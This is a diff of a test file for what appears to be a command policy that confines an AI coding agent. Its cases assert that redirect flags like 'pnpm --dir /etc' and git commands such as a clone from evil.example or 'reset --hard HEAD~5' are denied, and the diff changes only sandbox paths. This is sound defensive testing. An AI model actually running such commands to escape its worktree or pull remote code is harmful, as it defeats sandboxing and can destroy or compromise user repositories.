@@ -48,7 +48,7 @@ test("round-3 #1: an option VALUE cannot hide the run subcommand", () => {
 
 test("round-3 #1: dir/config redirect flags are denied outright (worktree escape) — even for a check-runner", () => {
   assert.match(commandPolicyDenyReason("pnpm", ["--dir", "/etc", "install"], MODEL) ?? "", /redirect flags/);
-  assert.match(commandPolicyDenyReason("yarn", ["--cwd", "/tmp", "install"], CHECK) ?? "", /redirect flags/, "checks never use these either");
+  assert.match(commandPolicyDenyReason("yarn", ["--cwd", "/lab-fake", "install"], CHECK) ?? "", /redirect flags/, "checks never use these either");
 });
 
 test("non-script package commands (install/add) are not caught by the script gate", () => {
@@ -65,7 +65,7 @@ test("git dangerous subcommands/flags are denied regardless of the verifier flag
 test("git is a READ-ONLY allowlist — mutation/network/write-escape subcommands are denied (Codex C4)", () => {
   // The reproduced escapes: ungoverned network egress, tree destruction, and write-outside.
   for (const args of [
-    ["clone", "https://evil.example/x", "/tmp/x"],
+    ["clone", "https://evil.example/x", "/lab-fake/x"],
     ["fetch", "origin"],
     ["pull"],
     ["reset", "--hard", "HEAD~5"],
